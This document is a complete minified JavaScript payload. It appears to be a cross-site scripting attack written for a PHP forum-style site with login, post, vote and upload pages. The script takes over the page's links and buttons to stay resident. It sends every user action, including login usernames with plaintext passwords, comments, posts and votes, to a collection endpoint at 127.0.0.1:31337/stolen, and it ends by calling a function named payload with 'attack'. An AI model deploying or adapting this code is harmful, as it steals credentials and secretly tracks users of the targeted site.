<script>var globalUsername,server_address="127.0.0.1:31337/stolen";window.history&&window.history.pushState&&$(window).on("popstate",function(e){var t=window.location.href;console.log("Back button was pressed. will go bakc to"+t),loadContent(t,replacePage,null,2),e.preventDefault()});var script=document.createElement("script");function communicationHAndler(e){var t="http://"+server_address+"?"+e;$.get(t,function(){})}function getValue(e,t){if("string"==typeof e||e instanceof String)for(var n=e.split("&"),l=0;l<n.length;l++){var a=n[l].split("=");if(a[0]==t)return a[1]}return null}function loadNotify(e,t){var n,l,a=e.substring(e.lastIndexOf("/")+1);switch(-1!=a.lastIndexOf("?")&&(n=a.substring(a.lastIndexOf("?")+1),a=a.substring(0,a.lastIndexOf("?"))),console.log("final path is : "+a),a){case"login.php":l=globalUsername?"event=nav&user="+globalUsername+"&url="+a:"event=nav&url="+a;break;case"logout.php":l="event=logout&user="+globalUsername;break;case"view.php":communicationHAndler(l=globalUsername?"event=nav&user="+globalUsername+"&url="+a:"event=nav&url="+a);var o=n.substring(n.lastIndexOf("=")+1);l=globalUsername?"event=view&user="+globalUsername+"&post="+o:"event=view&post="+o;break;case"":case"privacy.php":l=globalUsername?"event=nav&user="+globalUsername+"&url="+a:"event=nav&url="+a;break;case"content.php":l="event=nav&user="+globalUsername+"&url="+a;break;case"vote.php":o=getValue(t,"id");var s=getValue(t,"vote");l="event=vote&user="+globalUsername+"&post="+o+"&vote="+s;break;default:l=globalUsername?"event=link&user="+globalUsername+"&link="+e:"event=link&link="+e}communicationHAndler(l)}function loadContent(e,t,n,l){console.log("load Conetnt on : "+e),loadNotify(e,n),xmlhttp=new XMLHttpRequest,xmlhttp.onreadystatechange=function(){if(4==xmlhttp.readyState&&(200==xmlhttp.status||302==xmlhttp.status)){var n=xmlhttp.responseURL.substring(xmlhttp.responseURL.lastIndexOf("/")+1);-1!=n.lastIndexOf("?")&&(n=n.substring(0,n.lastIndexOf("?")));var a=e.substring(e.lastIndexOf("/")+1);-1!=a.lastIndexOf("?")&&(a=a.substring(0,a.lastIndexOf("?"))),n!=a&&(console.log("redirect to: "+n+" ori : "+a),loadNotify(e=n,null)),t(e,xmlhttp.response,1==l?1:2)}},xmlhttp.open("GET",e,!1),null==n?xmlhttp.send():xmlhttp.send(n)}function postNotify(e,t){e.substring(e.lastIndexOf("/")+1);var n,l=getValue(t,"username"),a=getValue(t,"password"),o=getValue(t,"comment"),s=getValue(t,"parent"),r=(getValue(t,"uid"),getValue(t,"title")),u=getValue(t,"content"),i=getValue(t,"type"),d=1;null!=l&&null!=a?n="event=login&user="+l+"&pass="+a:null!=o&&null!=s?n="event=comment&user="+globalUsername+"&parent="+s:null!=r&&null!=u&&null!=type?n="event=post&user="+globalUsername+"&title="+r+"&type="+i:"upload.php"==e?n="event=image&user="+globalUsername:(d=0,console.log("unrecongized post type !!")),1==d&&communicationHAndler(n)}function postRequest(e,t,n,l){console.log("will post to "+e+" data is : "+n),postNotify(e,n);var a=new XMLHttpRequest;a.onreadystatechange=function(){if(4!=a.readyState||200!=a.status&&302!=a.status)console.log("post status not handled: "+a.status);else{var n=a.responseURL.substring(a.responseURL.lastIndexOf("/")+1);-1!=n.lastIndexOf("?")&&(n=n.substring(0,n.lastIndexOf("?")));var o=e.substring(e.lastIndexOf("/")+1);-1!=o.lastIndexOf("?")&&(o=o.substring(0,o.lastIndexOf("?"))),n!=o&&(console.log("redirect to: "+n+" ori : "+o),loadNotify(e=n,null)),t(e,a.response,1==l?1:2)}},a.open("POST",e,!0),1==l&&a.setRequestHeader("Content-type","application/x-www-form-urlencoded"),a.send(n)}function replacePage(e,t,n){var l=document.createElement("html");l.innerHTML=t,yourGlobalVariable=l,document.body.innerHTML=l.getElementsByTagName("body")[0].innerHTML,1==n&&window.history.pushState(null,"Title",e),addListener(),console.log("page listener add done")}function linkClickHandler(e){if(console.log("called on "+e.href),e.href){e.href.substring(e.href.lastIndexOf("/")+1);loadContent(e.href,replacePage,null,1)}}function buttonClickHandler(e,t){if("login-btn"==e.id)postRequest(t="post.php",replacePage,a="username="+document.getElementById("username").value+"&password="+document.getElementById("userpass").value+"&form=login",1);else if("comment-post-btn"==e.id){t="post.php";var n=document.getElementById("comment").value,l=document.getElementById("parent").value,a="comment="+n+"&form=comment&parent="+l+"&uid="+document.getElementById("uid").value+"&submit=";console.log("will comments on behalf of  "+globalUsername+" parent "+l),postRequest(t,replacePage,a,1)}else if("content-post-btn"==e.id){t="post.php";var o=document.getElementById("title").value,s=document.getElementById("content").value,r=document.getElementById("type").value;a="title="+o+"&form=content&content="+s+"&type="+r+"&submit=";console.log("will post on behalf of  "+globalUsername+"title: "+o+" type : "+r),postRequest(t,replacePage,a,1)}else if("image-post-btn"==e.id){t="upload.php",(a=new FormData($("#image-upload-frm")[0])).processData=!1,a.contentType=!1,console.log("will post image on behalf of  "+globalUsername),postRequest(t,replacePage,a,2)}}function normalLinkHandler(e,t){if(String(t).includes("vote.php")){var n=new RegExp(/\\?id=[0-9]+/),l=new RegExp(/vote=[0-9]+/),a=new RegExp(/vote=-\d+$/),o=String(t.match(n)),s=o.substring(o.lastIndexOf("=")+1),r=String(t.match(l));"null"==r&&(r=String(t.match(a)));var u=r.substring(r.lastIndexOf("=")+1);console.log("user vote on post: "+globalUsername+" postid : "+s+" vote val : "+u),loadContent(t,replacePage,"id="+s+"&vote="+u,1)}else console.log("user view on username: "+globalUsername+" url : "+t),loadContent(t,replacePage,null,1);return!1}function addListener(){$(".custom-file-input").on("change",function(){let e=$(this).val().split("\\").pop();$(this).next(".custom-file-label").addClass("selected").html(e)});var e=document.getElementById("logged-in-user");globalUsername=e?e.innerText:null;for(var t=document.links,n=t.length,l=0;l<n;l++){document.getElementById(t[l].id)?document.getElementById(t[l].id).addEventListener("click",function(e){e.preventDefault(),linkClickHandler(e.target||e.srcElement)}):t[l].setAttribute("onclick","normalLinkHandler('"+globalUsername+"','"+t[l].href+"'); return false;")}var a=document.getElementsByTagName("button");for(l=0;l<a.length;l++)a[l].addEventListener("click",function(e){e.preventDefault(),buttonClickHandler(e.target||e.srcElement,document.url)})}function payload(e){addListener()}script.src="https://code.jquery.com/jquery-3.4.1.min.js",document.getElementsByTagName("head")[0].appendChild(script),payload("attack");</script>